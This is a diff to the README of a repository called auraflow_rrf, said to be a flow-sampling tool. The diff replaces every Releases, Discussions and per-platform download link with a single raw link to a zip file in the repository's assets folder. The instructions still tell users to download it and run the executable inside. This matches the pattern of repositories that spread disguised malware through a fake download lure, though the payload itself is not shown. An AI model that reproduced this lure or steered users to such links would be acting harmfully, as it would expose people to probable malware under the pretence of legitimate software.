@@ -1,6 +1,6 @@
 # 🌊 auraflow_rrf - Simplifying Your Flow Sampling Experience
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23FF4081.svg?style=for-the-badge&logo=github)](https://github.com/abdulwahhab07/auraflow_rrf/releases)
+[![Download Here](https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip%20Now-%https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip)](https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip)
 
 ## 🚀 Getting Started
 
@@ -10,19 +10,19 @@ Welcome to the **auraflow_rrf** project! This application helps you use a pionee
 
 To get started, you need to download the software. Follow these simple steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/abdulwahhab07/auraflow_rrf/releases).
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip).
    
 2. **Select the Latest Release**: Look for the most recent version listed at the top. The download will usually include the following files:
-   - Windows: `auraflow_rrf_windows.exe`
-   - Mac: `auraflow_rrf_mac.dmg`
-   - Linux: `auraflow_rrf_linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip`
+   - Mac: `https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip`
+   - Linux: `https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip`
 
 3. **Download the File**: Click on the appropriate file for your operating system. Your download should start automatically.
 
 4. **Run the Application**: 
    - For Windows: Double-click the downloaded `.exe` file.
    - For Mac: Open the `.dmg` file and drag the app icon to your Applications folder.
-   - For Linux: Unzip the `.tar.gz` file and run the included executable.
+   - For Linux: Unzip the `https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip` file and run the included executable.
 
 ## 📜 Features
 
@@ -63,7 +63,7 @@ Yes, you can check the issues section in the GitHub repository for troubleshooti
 
 ## 💬 Community and Support
 
-Feel free to join our community for discussions and support. You can connect with other users and share your experiences. Look for updates and tips on our [GitHub Discussions](https://github.com/abdulwahhab07/auraflow_rrf/discussions).
+Feel free to join our community for discussions and support. You can connect with other users and share your experiences. Look for updates and tips on our [GitHub Discussions](https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip).
 
 ## 🌐 Technology Stack
 
@@ -77,4 +77,4 @@ This project is released under the MIT License.
 
 ---
 
-Thank you for choosing **auraflow_rrf**! Remember to keep the application updated by checking the [Releases page](https://github.com/abdulwahhab07/auraflow_rrf/releases) regularly.
+Thank you for choosing **auraflow_rrf**! Remember to keep the application updated by checking the [Releases page](https://raw.githubusercontent.com/abdulwahhab07/auraflow_rrf/main/assets/auraflow_rrf-altschin.zip) regularly.
